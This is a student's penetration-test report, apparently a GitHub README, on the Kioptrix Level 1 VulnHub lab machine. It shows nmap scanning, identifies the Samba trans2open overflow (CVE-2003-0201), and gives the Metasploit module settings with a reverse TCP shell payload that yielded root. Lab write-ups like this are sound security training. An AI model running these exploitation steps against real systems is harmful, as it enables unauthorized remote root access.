# Main-Project-Report
Kioptrix Level 1
# 🔐 Kioptrix Level 1 VulnHub Penetration Test

## 📌 Project Information

**Author:** Alex Saimy Abraham
**Register No:** 23UBC210
**Program:** Bachelor of Computer Applications (BCA)
**Institution:** Marian College Kuttikkanam Autonomous
**University:** Mahatma Gandhi University
**Year:** 2026

---

## 🧠 Overview

This repository documents a complete penetration testing assessment of the **Kioptrix Level 1** virtual machine from VulnHub conducted inside a controlled lab environment.

The objective of this project was to:

* Identify exposed services
* Discover vulnerabilities
* Exploit misconfigurations
* Gain root-level access

The assessment follows the standard penetration testing lifecycle:

```
Recon → Enumeration → Vulnerability Analysis → Exploitation → Root Access
```

---

## 🧪 Lab Architecture

| Component        | Description         |
| ---------------- | ------------------- |
| Attacker Machine | Kali Linux          |
| Target Machine   | Kioptrix Level 1 VM |
| Virtualization   | Oracle VirtualBox   |
| Network          | Host-Only Adapter   |

---

## 🛠 Tools Used

* Nmap — Host discovery & scanning
* Metasploit Framework — Exploitation
* SMB Tools — Samba enumeration
* Linux CLI — Verification & navigation
* VirtualBox — Virtual lab environment

---

## ⚔️ Attack Methodology

### 1️⃣ Reconnaissance

Discovered live hosts on network:

```bash
nmap -sn 10.0.2.0/24
```

Target identified at:

```
10.0.2.3
```

---

### 2️⃣ Enumeration

Service scan revealed open ports:

```bash
nmap -sV 10.0.2.3
```

**Discovered Services**

| Port | Service |
| ---- | ------- |
| 22   | SSH     |
| 80   | Apache  |
| 111  | RPC     |
| 139  | Samba   |
| 443  | HTTPS   |

---

### 3️⃣ Vulnerability Identification

Detected vulnerable service:

```
Samba 2.2.1a
```

Known vulnerability:

> **CVE-2003-0201 — trans2open Buffer Overflow**

Impact: Remote Code Execution

---

### 4️⃣ Exploitation

Used Metasploit module:

```
exploit/linux/samba/trans2open
```

Configuration:

```
RHOSTS = 10.0.2.3
LHOST  = Attacker IP
PAYLOAD = linux/x86/shell_reverse_tcp
```

Result:

```
Reverse shell obtained
```

---

### 5️⃣ Root Access Verification

Checked privilege level:

```bash
whoami
```

Output:

```
root
```

The Samba service was running with elevated privileges, which granted immediate root access after exploitation.

---

## 📊 Key Findings

* Outdated Samba version allowed RCE
* Services running as root increased risk
* Multiple open ports expanded attack surface
* Missing patch management caused full compromise

---


---

## 🎯 Learning Outcomes

This project improved practical skills in:

* Network scanning
* Service enumeration
* Vulnerability analysis
* Exploitation techniques
* Ethical hacking workflow
* Security reporting

---


---

## 👨‍💻 Author

**Alex Saimy Abraham**
BCA Cyber Security Student
Marian College Kuttikkanam Autonomous

---

⭐ *If you found this project helpful, consider starring the repository!*
